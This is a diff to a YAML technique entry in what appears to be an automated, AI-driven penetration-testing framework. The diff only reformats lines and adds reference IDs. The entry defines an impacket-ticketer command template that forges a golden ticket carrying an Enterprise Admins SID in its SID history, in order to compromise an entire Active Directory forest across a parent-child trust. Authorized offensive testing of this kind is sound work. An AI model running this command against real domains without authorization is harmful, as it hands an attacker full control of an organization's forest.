@@ -5,8 +5,8 @@ preconditions:
 - domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{child_sid}'
-  -extra-sid '{parent_da_sid}' -domain {child_domain} Administrator
+command_template: impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{child_sid}' -extra-sid '{parent_da_sid}' -domain
+  {child_domain} Administrator
 parser: impacket_parser
 expected_effects:
 - sid_history_added
@@ -15,6 +15,26 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: Add Enterprise Admins SID to golden ticket's SID history. Cross parent-child
-  trust for forest compromise. Requires krbtgt hash of child domain.
+mechanism: Add Enterprise Admins SID to golden ticket's SID history. Cross parent-child trust for forest compromise. Requires
+  krbtgt hash of child domain.
 hacktricks_ref: windows-hardening/active-directory-methodology/README.md
+references:
+  ocd_mindmap_node_ids:
+  - 052b83ea87
+  - 155b42d9cd
+  - 1b0601fc2a
+  - 284313549c
+  - 315401be55
+  - 47d646d229
+  - 79afa96e1d
+  - 8eb839a8b3
+  - 93327147fe
+  - 9684291d34
+  - a47b5457cf
+  - bbf0cf961b
+  - cc231d6118
+  - cd0a1d2990
+  - d01513dd53
+  - d7e78abb5b
+  - d9683fa976
+  - e190afe523
